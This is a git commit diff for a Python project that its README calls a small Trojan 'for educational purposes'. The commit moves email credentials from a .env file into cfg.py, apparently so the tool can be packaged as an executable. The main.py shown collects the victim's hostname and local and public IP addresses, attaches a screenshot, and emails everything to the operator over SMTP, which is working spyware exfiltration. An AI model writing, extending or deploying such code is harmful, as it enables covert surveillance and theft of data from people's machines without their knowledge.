ac7f5fd2379024a1632fb16ca3b58c4757a204bc
sh1ney <vilensky.net@mail.ru>
2024-10-17 18:50:39 +0500

    Change .env to cfg.py creds storing

--- README.md
+++ README.md
@@ -2,10 +2,11 @@
 
 ## A small Trojan written in python for educational purposes
 
-### .env
+### cfg.py
 
 ```
 SMTP_SRV='<your_smtp_server>'
+SMTP_PORT=<your_smtp_port>
 EMAIL='<your_email>'
 EMAIL_PASS=<your_email_password>'
 ```
--- main.py
+++ main.py
@@ -5,17 +5,19 @@ from email.mime.base import MIMEBase
 from email import encoders
 from cv import screenshot
 from host_info import get_ip
-import os
-from dotenv import load_dotenv
+# import os
+# from dotenv import load_dotenv
+import cfg
 
 
 def main():
-    load_dotenv()
 
-    email = os.getenv('EMAIL')
-    passwd = os.getenv('EMAIL_PASS')
-    smtp_server = os.getenv('SMTP_SRV')
-    # smtp_port = int(os.getenv('SMTP_PORT'))
+    # load_dotenv() Need to understand how add .env in exe file
+
+    email = cfg.EMAIL # os.getenv('EMAIL')
+    passwd = cfg.EMAIL_PASS # os.getenv('EMAIL_PASS')
+    smtp_server = cfg.SMTP_SRV # os.getenv('SMTP_SRV')
+    smtp_port = cfg.SMTP_PORT # int(os.getenv('SMTP_PORT'))
 
     info = get_ip()
     subject = f"Host: {info[0]} Local IP: {info[1]} Public IP: {info[2]}"
@@ -36,8 +38,7 @@ def main():
 
     msg.attach(part)
 
-    with smtplib.SMTP_SSL(smtp_server, 465) as server:
-        server.connect(smtp_server, 465)
+    with smtplib.SMTP_SSL(smtp_server, smtp_port) as server:
         server.login(email, passwd)
         server.send_message(msg)
 
